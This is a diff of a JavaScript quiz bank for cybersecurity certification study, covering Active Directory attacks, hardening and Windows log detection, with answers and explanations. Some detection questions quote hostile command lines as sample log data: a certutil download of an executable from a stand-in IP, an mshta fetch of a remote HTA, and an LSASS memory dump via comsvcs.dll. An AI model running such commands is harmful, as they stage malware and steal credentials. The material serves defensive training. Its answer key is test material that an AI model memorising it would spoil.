         "question": "A hardened Windows estate enforces application allowlisting with WDAC (or AppLocker). Why can living-off-the-land binaries still undermine that control?",
@@ -19637,7 +22835,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "Allowlisting permits known-good binaries; LOLBins that stay trusted can still fetch or launch attacker code, so defence needs tighter rules and script controls. WDAC does not ban all Microsoft binaries, expose a cleartext bypass list, or auto-trust HTTP downloads.",
-        "difficulty": "Hard"
+        "difficulty": "Hard",
+        "exam": "scor",
+        "topic": "endpoint",
+        "domain": "5.1"
       },
       {
         "question": "During a forest migration, an account keeps an old high-privilege SID in its SID History. Why is that dangerous across a forest trust, and what mitigates it?",
@@ -19649,7 +22850,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 3,
         "explanation": "SID History can carry group SIDs into the access token; across a forest trust that can elevate privileges unless SID filtering (quarantine) strips unexpected SIDs. It is not cosmetic, not only an encryption downgrade, and is not always stripped on every trust.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "identidade",
+        "domain": "6.1"
       },
       {
         "question": "During an AD assessment you find Groups.xml under SYSVOL that still contains a cpassword attribute from old Group Policy Preferences. Why is that still valuable to an attacker today?",
@@ -19661,7 +22865,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "GPP stored passwords with a well-known AES key (MS14-025 era). Readable SYSVOL cpassword values decrypt offline to cleartext. It is not a mere HMAC, not limited to a local SID, and DCs do not auto-strip every legacy copy.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "identidade",
+        "domain": "3.2"
       },
       {
         "question": "In the noPac (CVE-2021-42278 / CVE-2021-42287) attack chain against Active Directory, what combination lets a low-privileged user escalate toward domain admin rights?",
@@ -19673,7 +22880,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 3,
         "explanation": "noPac chains sAMAccountName spoofing (looking like a DC without $) with Kerberos TGT/TGS handling so the PAC is issued for the impersonated DC. It is not a simple HKLM flip by any user, not LLMNR-to-Silver-Ticket alone, and not PrintNightmare on a workstation.",
-        "difficulty": "Hard"
+        "difficulty": "Hard",
+        "exam": "cbrops",
+        "topic": "identidade",
+        "domain": "2.8"
       },
       {
         "question": "An attacker obtains the Directory Services Restore Mode (DSRM) password for a domain controller. In what situation does that credential become especially dangerous for persistence or recovery abuse?",
@@ -19685,7 +22895,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 0,
         "explanation": "DSRM is the local SAM Administrator-equivalent on a DC. With DsrmAdminLogonBehavior allowing logon while AD DS is running, it is a durable break-glass secret independent of normal domain account rotation. It does not become krbtgt, does not auto-become Azure Global Admin, and Credential Guard is unrelated to inventing that property.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "identidade",
+        "domain": "2.8"
       },
       {
         "question": "A principal in the DNSAdmins group can load a DLL via the DNS Server's server-level plugin path. Why is that often treated as a privilege-escalation path to the Domain Controller?",
@@ -19697,7 +22910,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 3,
         "explanation": "On many DCs the DNS Server service runs as SYSTEM. Members of DNSAdmins can configure a server-level plugin DLL that dns.exe loads, yielding SYSTEM code execution and a path toward Domain Admin. DNSAdmins is not Domain Admin by itself; the risk is the privileged service context, not a scheduled-task trick or a SeDebugPrivilege gate that blocks DNSAdmins entirely.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "identidade",
+        "domain": "3.2"
       },
       {
         "question": "During an AD assessment you want the current password of a group Managed Service Account (gMSA). Which attribute / API path is typically used to retrieve the managed password blob for principals allowed to do so?",
@@ -19709,7 +22925,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 0,
         "explanation": "gMSA passwords are retrieved by allowed principals through the constructed attribute msDS-ManagedPassword (often via LDAP), not from a world-readable clear-text userPassword, not via NetUserGetInfo for any domain user, and not over anonymous UnicodePwd binds. Membership in PrincipalsAllowedToRetrieveManagedPassword (or equivalent rights) controls who can get the blob.",
-        "difficulty": "Hard"
+        "difficulty": "Hard",
+        "exam": "cbrops",
+        "topic": "identidade",
+        "domain": "2.8"
       },
       {
         "question": "Why do hardening guides push LDAP signing and LDAP channel binding on domain controllers?",
@@ -19721,7 +22940,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "LDAP signing ensures integrity of LDAP messages; channel binding associates the LDAP exchange with the underlying TLS channel so a relayed bind is harder to pull off. They do not replace Kerberos with NTLM, do not by themselves firewall 389, and do not alone stop BloodHound when a user credential exists.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "identidade",
+        "domain": "2.3"
       },
       {
         "question": "An admin account is added to the Active Directory 'Protected Users' group. Which effect does that membership have?",
@@ -19733,7 +22955,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "Protected Users hardens member accounts: no NTLM, no DES or RC4 in Kerberos pre-authentication, no unconstrained or constrained delegation, no cached plaintext credentials via CredSSP/WDigest, and a 4-hour non-renewable TGT. It does not remove lockout, delete hashes from DCs, or force jump-server logons. It is meant for user accounts, not service or computer accounts.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "identidade",
+        "domain": "6.1"
       },
       {
         "question": "In a 'Timeroasting' attack, an unauthenticated attacker sends MS-SNTP time requests to a domain controller. What do they gain, and when is it dangerous?",
@@ -19745,7 +22970,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "With MS-SNTP, a DC signs time responses using a key derived from the NT hash of the computer account whose RID is in the request. An attacker can ask for many RIDs without authenticating and crack the results offline. It mainly hits computer accounts with weak or manually set passwords (for example pre-created or 'pre-Windows 2000' accounts); normal auto-rotated machine passwords are effectively uncrackable. It does not leak krbtgt, change the DC clock, or list user logons.",
-        "difficulty": "Hard"
+        "difficulty": "Hard",
+        "exam": "cbrops",
+        "topic": "identidade",
+        "domain": "2.8"
       },
       {
         "question": "In the Active Directory tiered administration model, what is the core rule for Tier 0 admin accounts?",
@@ -19757,7 +22985,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 0,
         "explanation": "Tier 0 covers the identity control plane: domain controllers, AD CS, AD FS, sync servers and their admins. Those credentials must only be used on Tier 0 systems; logging on to a Tier 1 server or a Tier 2 workstation leaves hashes or tickets there for an attacker to steal. Routine endpoint work belongs to lower-tier accounts, shared admin accounts break accountability, and MFA at sign-in does not stop credentials being cached in memory.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "identidade",
+        "domain": "1.9"
       },
       {
         "question": "Why do AD hardening guides recommend setting ms-DS-MachineAccountQuota to 0 on the domain?",
@@ -19769,7 +23000,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "ms-DS-MachineAccountQuota defaults to 10, so any authenticated user can create up to 10 computer accounts. An attacker-controlled machine account (with a known password and SPN) is a key step in attacks such as resource-based constrained delegation abuse, noPac and some relay chains. Setting it to 0 and delegating domain joins to a specific group removes that foothold. It does not affect DC logon rights, replication or Kerberos versus NTLM.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "identidade",
+        "domain": "2.5"
       },
       {
         "question": "In an AD-integrated DNS zone, an attacker with only a normal domain user account adds a wildcard (*) record pointing to their own IP. What does this achieve?",
@@ -19781,7 +23015,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "By default authenticated users can create new records in AD-integrated DNS zones (ADIDNS). A wildcard record answers for any name that does not already exist, so typos and decommissioned hostnames resolve to the attacker, who can capture or relay NTLM authentication, similar to LLMNR/NBT-NS poisoning but domain-wide. Existing records such as DC A records are not overwritten, zone transfers and DNSSEC are separate settings. Mitigate by restricting record creation and pre-creating a wildcard record.",
-        "difficulty": "Hard"
+        "difficulty": "Hard",
+        "exam": "cbrops",
+        "topic": "ameacas",
+        "domain": "2.5"
       },
       {
         "question": "What does enabling LSA protection (RunAsPPL) on a Windows host mainly do?",
@@ -19793,7 +23030,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 3,
         "explanation": "LSA protection runs lsass.exe as a Protected Process Light (PPL). Non-protected processes, even with admin rights and SeDebugPrivilege, cannot open it to read memory or inject code, and only signed LSA plugins load, which blocks tools like Mimikatz's sekurlsa without a kernel driver. Isolating secrets in a hypervisor-protected VM is Credential Guard; it does not encrypt the SAM with the TPM or disable NTLM.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "endpoint",
+        "domain": "5.1"
       },
       {
         "question": "Why do hardening guides often require SMB signing on Windows clients and servers?",
@@ -19805,7 +23045,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "SMB signing uses the session key to integrity-protect SMB messages. After an NTLM relay, the attacker does not have that key, so a server that requires signing rejects the relayed SMB session. Signing is not full encryption of file data, does not by itself replace NTLM with Kerberos, and is separate from disabling guest/null sessions.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "rede-cloud",
+        "domain": "2.3"
       },
       {
         "question": "What does Microsoft LAPS (Local Administrator Password Solution) mainly achieve on domain-joined Windows machines?",
@@ -19817,7 +23060,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 3,
         "explanation": "LAPS (and Windows LAPS) gives each domain-joined PC a different random local Administrator password, saved in Active Directory (ms-Mcs-AdmPwd or the newer Windows LAPS attributes) and readable only by groups you delegate. That stops lateral movement that reused one local-admin password across many machines. It is not a single OU-wide password in a GPO, not a gMSA replacement for the local admin, and not Credential Guard.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "endpoint",
+        "domain": "5.2"
       },
       {
         "question": "After a suspected golden-ticket incident, why do recovery guides tell you to reset the krbtgt account password twice, with replication in between?",
@@ -19829,7 +23075,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 0,
         "explanation": "A golden ticket is a forged TGT signed with a krbtgt password hash. AD remembers the current and previous krbtgt keys for ticket decryption, so a single password reset still leaves the old key valid. Resetting twice (waiting for replication after each) retires both keys and invalidates tickets forged with either. It is not about deleting/recreating the account, LSASS caching across reboots, or a mandatory third reset for every forest.",
-        "difficulty": "Hard"
+        "difficulty": "Hard",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "5.3"
       },
       {
         "question": "Why do Active Directory hardening guides recommend that domain admins work from a Privileged Access Workstation (PAW)?",
@@ -19841,7 +23090,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 0,
         "explanation": "A PAW is a hardened workstation reserved for privileged administration, with no email, browsing or general apps. If admins sign in only there, their high-value credentials are never exposed on everyday machines where phishing or drive-by malware could steal them. It does not move passwords into a TPM to change how DCs accept logons, does not act as a DC, and has no hostname rule.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "identidade",
+        "domain": "1.9"
       },
       {
         "question": "What does PowerShell Just Enough Administration (JEA) mainly provide on a Windows server?",
@@ -19853,7 +23105,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "JEA publishes a PowerShell remoting endpoint whose role capabilities list exactly which cmdlets, functions and parameters each group may use. Commands usually run as a temporary virtual or group-managed account, so helpdesk staff can, for example, restart a service without being local admins. It is not a signing policy, not a time-boxed membership of Administrators, and it still runs over WinRM.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "identidade",
+        "domain": "6.2"
       },
       {
         "question": "In Active Directory you enable Kerberos armoring (FAST, Flexible Authentication Secure Tunneling) for clients and DCs. What does it mainly add?",
@@ -19865,7 +23120,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "FAST builds an armored tunnel for the AS-REQ/AS-REP exchange using a key from the machine account's TGT. That protects the user's pre-authentication data from offline password guessing, lets the KDC send signed errors that cannot be forged, and supports compound claims for Dynamic Access Control. It does not change service-ticket ciphers, does not require smart cards, and does not change how Protected Users get TGTs.",
-        "difficulty": "Hard"
+        "difficulty": "Hard",
+        "exam": "scor",
+        "topic": "identidade",
+        "domain": "1.5"
       },
       {
         "question": "A security team enables the Microsoft Defender Attack Surface Reduction (ASR) rule 'Block all Office applications from creating child processes'. Which attack does this mainly disrupt?",
@@ -19877,7 +23135,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "Many malware campaigns start with a document whose macro or exploit makes Word or Excel spawn PowerShell, cmd.exe, wscript or another binary to fetch the payload. This ASR rule stops Office apps from creating child processes, breaking that chain even if the user enables macros. It does not filter phishing links, does not protect files from ransomware (that is Controlled Folder Access) and has nothing to do with license keys.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "endpoint",
+        "domain": "5.1"
       },
       {
         "question": "Why do Active Directory hardening guides treat membership of the built-in Backup Operators group on domain controllers as almost equal to Domain Admin?",
@@ -19889,7 +23150,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 3,
         "explanation": "Backup Operators hold SeBackupPrivilege and SeRestorePrivilege and can log on to domain controllers. Backup privilege bypasses file ACLs, so a member can copy NTDS.dit (for example from a shadow copy) and the SYSTEM hive, then extract all account hashes offline, krbtgt included. That is why the group belongs in Tier 0 and should normally be empty. It does not join Enterprise Admins, reset passwords silently or grant SYSTEM on workstations.",
-        "difficulty": "Hard"
+        "difficulty": "Hard",
+        "exam": "scor",
+        "topic": "identidade",
+        "domain": "6.1"
       },
       {
         "question": "On a domain controller, which log pattern is a common sign of Kerberoasting in an environment that normally uses AES for Kerberos?",
@@ -19901,7 +23165,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 0,
         "explanation": "In Kerberoasting an attacker asks the KDC for service tickets for accounts with SPNs and cracks them offline; requesting RC4 makes cracking much faster. On a DC this shows up as event 4769 with Ticket Encryption Type 0x17, often a burst from one user for many SPNs. Event 4625 bursts point to password spraying or brute force, 4720 plus group changes to persistence, and 1102 to someone hiding tracks.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "3.5"
       },
       {
         "question": "An analyst suspects PsExec-style lateral movement onto a file server. Which entry in that server's logs is the classic sign?",
@@ -19913,7 +23180,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "PsExec copies a service binary to the target's ADMIN$ share and creates a service (PSEXESVC by default) to run commands, so the target logs System event 7045, plus Security event 4697 if auditing is on, next to a type 3 network logon from the source. Renamed services still show the same pattern. PsExec uses SMB on port 445, not RDP, and it does not need failed logons or lock the console.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "3.5"
       },
       {
         "question": "Attackers on a network run heavily obfuscated PowerShell (Base64 and string concatenation). Which Windows logging feature best shows the defenders what code actually ran?",
@@ -19925,7 +23195,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "Script Block Logging (event 4104 in Microsoft-Windows-PowerShell/Operational) records the code of each script block as PowerShell compiles it, so Base64 or concatenated strings show up in their decoded form, and Windows auto-logs blocks that look suspicious even when the policy is off. Transcription is useful but records console input and output rather than the decoded script. Firewall and Kerberos logon logs do not contain the PowerShell code at all.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "3.5"
       },
       {
         "question": "On a workstation with Sysmon, which event is the most direct sign that a tool such as Mimikatz is trying to read credentials from memory?",
@@ -19937,7 +23210,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 3,
         "explanation": "Credential dumpers open a handle to lsass.exe with memory-read rights. Sysmon Event ID 10 (ProcessAccess) records the source process, the target and the GrantedAccess mask, and masks like 0x1010 or 0x1410 from a process that has no business touching LSASS are a classic detection. LSASS does not send hashes out over the network, .kirbi files are optional ticket exports saved wherever the attacker chooses, and every process loads ntdll.dll.",
-        "difficulty": "Hard"
+        "difficulty": "Hard",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "3.5"
       },
       {
         "question": "A user's domain account locks out every few minutes, even after a password reset. Where do you look first to find which machine is sending the bad passwords?",
@@ -19949,7 +23225,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "Bad password attempts are forwarded to the PDC emulator, which locks the account and logs event 4740 with the Caller Computer Name. That host is usually where a stale password lives: a mapped drive, a phone's mail app, a scheduled task or a service. Follow up with 4771 or 4776 failures on the DCs if needed. 4625 is a failed logon on the target machine, 4720 is account creation and 4624 is a successful logon.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "ccst-cyber",
+        "topic": "logs-ir",
+        "domain": "3.5"
       },
       {
         "question": "You suspect a DCSync attack. With Directory Service Access auditing on, which domain controller event best shows it?",
@@ -19961,7 +23240,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "DCSync uses the directory replication protocol (MS-DRSR) to ask a DC for password data, as a real DC would. With auditing on, the DC logs 4662 on the domain object with the replication rights, Get-Changes (1131f6aa-...) and Get-Changes-All (1131f6ad-...). Only DCs, and sometimes tools like Azure AD Connect, should do that, so the same request from a user account or workstation is a strong sign. DCSync does not modify objects, request krbtgt tickets or cause lockouts.",
-        "difficulty": "Hard"
+        "difficulty": "Hard",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "3.5"
       },
       {
         "question": "Hunting for AS-REP roasting, which detail in the domain controller logs is the strongest lead?",
@@ -19973,7 +23255,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 0,
         "explanation": "In AS-REP roasting the attacker asks for a TGT for accounts that don't need Kerberos pre-authentication; the KDC answers with data encrypted with the user's key, which is then cracked offline. The DC logs 4768 with Pre-Authentication Type 0. Find those accounts with PowerShell (DoesNotRequirePreAuth) and clear the flag. 4769 with 0x17 points to Kerberoasting, and the attack needs neither RDP nor online password guessing.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "3.5"
       },
       {
         "question": "On a workstation you find event 4698 at 03:12, created by a user account that never logs on at night. The new item runs powershell.exe with an encoded command every 15 minutes. What does this most likely show?",
@@ -19985,7 +23270,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 3,
         "explanation": "Event 4698 is logged when a scheduled task is created (with Audit Other Object Access Events on), and the event includes the task's XML with the action it runs. A task created at night by an unusual account that launches encoded PowerShell every few minutes is a classic persistence technique. Windows Update tasks are signed system tasks, failed logons are 4625 and password resets are 4724.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "3.5"
       },
       {
         "question": "Your EDR alerts that HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\\UseLogonCredential was set to 1 on a Windows 10 server. Why is this a serious warning sign?",
@@ -19997,7 +23285,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "Since Windows 8.1 and Server 2012 R2, WDigest no longer keeps cleartext credentials in LSASS. Setting UseLogonCredential to 1 brings that back, so after users log on again a tool like Mimikatz can dump their passwords in plain text. Attackers set it to prepare for credential theft. Alert on the change, set it back to 0 and look for LSASS access. It has nothing to do with NTLMv2, Defender or forced password changes.",
-        "difficulty": "Hard"
+        "difficulty": "Hard",
+        "exam": "cbrops",
+        "topic": "endpoint",
+        "domain": "3.5"
       },
       {
         "question": "Process logs on a PC show: certutil.exe -urlcache -split -f http://203.0.113.50/a.txt C:\\Users\\Public\\a.exe. Nobody on the IT team manages certificates on that PC. How should you read this?",
@@ -20009,7 +23300,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "certutil is a signed Windows binary meant for certificates, but '-urlcache -split -f <url> <file>' makes it download any file. Attackers use it to pull payloads without bringing their own downloader, which is why it is a well-known LOLBin. A .txt from a raw IP saved as an .exe in C:\\Users\\Public is a strong sign of malware staging, so isolate the host, collect the file and check its hash. CRL checks don't write executables, and Windows Update doesn't use certutil.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "3.5"
       },
       {
         "question": "During an investigation of a file server, the Security log starts at 02:47 today with event 1102, and there is nothing older. No admin planned any maintenance. What does this tell you?",
@@ -20021,7 +23315,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "Event 1102 means the audit log was cleared, and the event records the account that did it. With no planned work, a wiped Security log is a classic anti-forensics step, so check which account cleared it and look at the copies already forwarded to the SIEM or a log collector. A full log either overwrites old events or archives them without 1102, and service startup is logged as other events in the System log.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "3.4"
       },
       {
         "question": "Sysmon shows this on a server: rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 712 C:\\Temp\\d.bin full. Process 712 is lsass.exe. How should you treat it?",
@@ -20033,7 +23330,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "comsvcs.dll exports a MiniDump function, and calling it through rundll32 with the LSASS process ID writes a full memory dump of LSASS. Tools like Mimikatz can then pull password hashes and Kerberos tickets from that file offline. It is a well-known living-off-the-land technique, so isolate the host, treat the credentials of anyone logged on as exposed, and turn on LSA protection (RunAsPPL) and Credential Guard. Windows Error Reporting uses its own tools, and Defender doesn't scan through rundll32.",
-        "difficulty": "Hard"
+        "difficulty": "Hard",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "3.5"
       },
       {
         "question": "On a domain controller you see event 4720 for a new account 'svc_backup2' at 23:40, followed two minutes later by event 4732 adding it to the local Administrators group. Nobody opened a ticket for it. What is the right reading?",
@@ -20045,7 +23345,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 0,
         "explanation": "Event 4720 means a user account was created and 4732 means a member was added to a security-enabled local group, here Administrators. A new admin-level account created late at night without a change request is a typical persistence move, so find the creator in the event details, disable the account and check its logons and actions. Windows Server Backup doesn't create accounts, password spraying shows up as failed logons such as 4625 or 4771, and neither event is about archiving.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "3.5"
       },
       {
         "question": "In ten minutes a domain controller logs event 4771 with failure code 0x18 for 300 different user accounts, one or two attempts each, all from the same workstation IP. What is the most likely activity?",
@@ -20057,7 +23360,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "Event 4771 is a failed Kerberos pre-authentication, and code 0x18 means a wrong password. Many accounts with only one or two tries each from a single source is the pattern of password spraying, which stays under the lockout limit. Clock skew shows as code 0x25, a password change day doesn't come from one IP, and a stuck mapped drive repeats one account, not hundreds.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "3.5"
       },
       {
         "question": "EDR shows WINWORD.EXE starting 'mshta.exe http://203.0.113.50/inv.hta' on a user's laptop, followed by a PowerShell process with an encoded command. What is the best reading and first response?",
@@ -20069,7 +23375,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "mshta.exe runs HTML Applications with full script rights, and a remote HTA started by Word followed by encoded PowerShell is a classic macro dropper chain. Isolate the host, block the address, and turn on the ASR rule that blocks Office apps from creating child processes. Word templates don't come through mshta, the help viewer is hh.exe, and signature checks don't launch PowerShell.",
-        "difficulty": "Hard"
+        "difficulty": "Hard",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "5.3"
       },
       {
         "question": "On a file server, event 4648 shows that HR user 'mrosa' ran a process using the explicit credentials of 'adm-backup', a Domain Admin, and then connected to C$ on ten servers within minutes. What should the analyst conclude?",
@@ -20081,7 +23390,2500 @@ window.QUIZ_BANK = {
         ],
         "correct": 3,
         "explanation": "Event 4648 logs a logon attempted with explicit credentials, as with runas or 'net use /user'. An HR user wielding a Domain Admin account and touching admin shares across many servers points to stolen credentials being used for lateral movement. Disable or reset 'adm-backup', scope the hosts it reached, and check the HR laptop. 4648 is not written on every logon, backup services don't run under user sessions, and UAC never swaps you into another account.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "3.5"
+      },
+      {
+        "question": "Which option lists the three properties of the CIA triad?",
+        "options": [
+          "Confidentiality, Integrity, Availability",
+          "Control, Identity, Access for day-to-day operations",
+          "Compliance, Isolation, Auditing",
+          "Cryptography, Integrity, Authorization"
+        ],
+        "correct": 0,
+        "explanation": "The CIA triad is Confidentiality, Integrity and Availability, the three core goals that security controls aim to protect.",
+        "difficulty": "Easy",
+        "exam": "ccst-cyber",
+        "topic": "risco",
+        "domain": "1.1"
+      },
+      {
+        "question": "What is the main idea of a defense-in-depth strategy?",
+        "options": [
+          "Rely on one strong perimeter firewall for all protection",
+          "Use several layered controls so one failure does not expose everything",
+          "Encrypt all data and ignore physical access controls in typical enterprise networks",
+          "Give every user administrator rights to simplify support"
+        ],
+        "correct": 1,
+        "explanation": "Defense in depth stacks independent controls (network, host, application, physical, policy) so the failure of a single layer does not compromise the whole system.",
+        "difficulty": "Easy",
+        "exam": "ccst-cyber",
+        "topic": "risco",
+        "domain": "1.1"
+      },
+      {
+        "question": "A message tricks an employee into letting an unknown person follow them through a badge-controlled door. Which attack is this?",
+        "options": [
+          "Tailgating",
+          "Smishing",
+          "SQL injection",
+          "DNS poisoning"
+        ],
+        "correct": 0,
+        "explanation": "Tailgating (piggybacking) is a physical social-engineering attack where an attacker follows an authorized person through a secure door.",
+        "difficulty": "Easy",
+        "exam": "ccst-cyber",
+        "topic": "ameacas",
+        "domain": "1.2"
+      },
+      {
+        "question": "An SMS claims your bank card is blocked and asks you to tap a link to unlock it. What is this technique called?",
+        "options": [
+          "Vishing",
+          "Smishing",
+          "Whaling",
+          "Watering hole"
+        ],
+        "correct": 1,
+        "explanation": "Smishing is phishing carried out over SMS text messages; vishing uses voice calls and whaling targets executives.",
+        "difficulty": "Easy",
+        "exam": "ccst-cyber",
+        "topic": "ameacas",
+        "domain": "1.2"
+      },
+      {
+        "question": "What best describes an Advanced Persistent Threat (APT)?",
+        "options": [
+          "A one-off automated scan of random internet hosts",
+          "A stealthy, well-resourced actor that keeps long-term access to a target",
+          "A harmless misconfiguration found during an audit",
+          "A legacy virus that only spreads on floppy disks without additional tooling"
+        ],
+        "correct": 1,
+        "explanation": "An APT is a skilled, well-funded adversary (often state-linked) that gains and maintains covert long-term access to a specific target.",
+        "difficulty": "Medium",
+        "exam": "ccst-cyber",
+        "topic": "ameacas",
+        "domain": "1.2"
+      },
+      {
+        "question": "What is a botnet?",
+        "options": [
+          "A backup network kept offline for recovery in most production environments",
+          "A network of compromised devices remotely controlled by an attacker",
+          "A firewall cluster that balances traffic in most production environments",
+          "A protocol for encrypting email in transit"
+        ],
+        "correct": 1,
+        "explanation": "A botnet is a group of infected machines (bots) controlled by an attacker, typically used for DDoS, spam or credential stuffing.",
+        "difficulty": "Easy",
+        "exam": "ccst-cyber",
+        "topic": "ameacas",
+        "domain": "1.2"
+      },
+      {
+        "question": "In AAA, which part decides WHAT an authenticated user is allowed to do?",
+        "options": [
+          "Authentication",
+          "Authorization",
+          "Accounting",
+          "Association"
+        ],
+        "correct": 1,
+        "explanation": "Authentication proves who you are, Authorization decides what you may do, and Accounting records what you did.",
+        "difficulty": "Easy",
+        "exam": "ccst-cyber",
+        "topic": "identidade",
+        "domain": "1.3"
+      },
+      {
+        "question": "Why is RADIUS commonly used for network access control?",
+        "options": [
+          "It centralizes authentication so devices do not store local accounts",
+          "It encrypts all disk volumes on endpoints according to common practice",
+          "It replaces the need for any firewall rules",
+          "It is a routing protocol for choosing the best path"
+        ],
+        "correct": 0,
+        "explanation": "RADIUS centralizes AAA so switches, Wi-Fi and VPNs validate users against one server instead of local accounts on each device.",
+        "difficulty": "Medium",
+        "exam": "ccst-cyber",
+        "topic": "identidade",
+        "domain": "1.3"
+      },
+      {
+        "question": "Which is the best example of multi-factor authentication (MFA)?",
+        "options": [
+          "A long password changed every month",
+          "A password plus a code from an authenticator app",
+          "Two different passwords for the same account",
+          "A username that is hard to guess for day-to-day operations"
+        ],
+        "correct": 1,
+        "explanation": "MFA combines factors of different types; a password (something you know) plus an app code (something you have) qualifies, two passwords do not.",
+        "difficulty": "Easy",
+        "exam": "ccst-cyber",
+        "topic": "identidade",
+        "domain": "1.3"
+      },
+      {
+        "question": "What property does a cryptographic hash provide?",
+        "options": [
+          "It can be reversed to recover the original input",
+          "It maps data to a fixed-size value that is hard to reverse",
+          "It always encrypts data with a shared secret key",
+          "It compresses files to save storage space for day-to-day operations"
+        ],
+        "correct": 1,
+        "explanation": "A hash is a one-way function producing a fixed-size digest; it is not meant to be reversible and is not encryption.",
+        "difficulty": "Easy",
+        "exam": "ccst-cyber",
+        "topic": "cripto",
+        "domain": "1.4"
+      },
+      {
+        "question": "Which pairing of data state and protection is correct?",
+        "options": [
+          "Data in transit protected by TLS",
+          "Data at rest protected by disabling logs",
+          "Data in use protected by deleting backups",
+          "Data in transit protected by RAID mirroring"
+        ],
+        "correct": 0,
+        "explanation": "Data in transit is protected by transport encryption such as TLS; data at rest is protected by storage encryption; RAID and logs are not confidentiality controls.",
+        "difficulty": "Medium",
+        "exam": "ccst-cyber",
+        "topic": "cripto",
+        "domain": "1.4"
+      },
+      {
+        "question": "What does a digital certificate primarily bind together?",
+        "options": [
+          "A public key and the identity of its owner",
+          "Two symmetric keys for faster encryption",
+          "A password and a one-time code during routine maintenance windows",
+          "A MAC address and an IP address"
+        ],
+        "correct": 0,
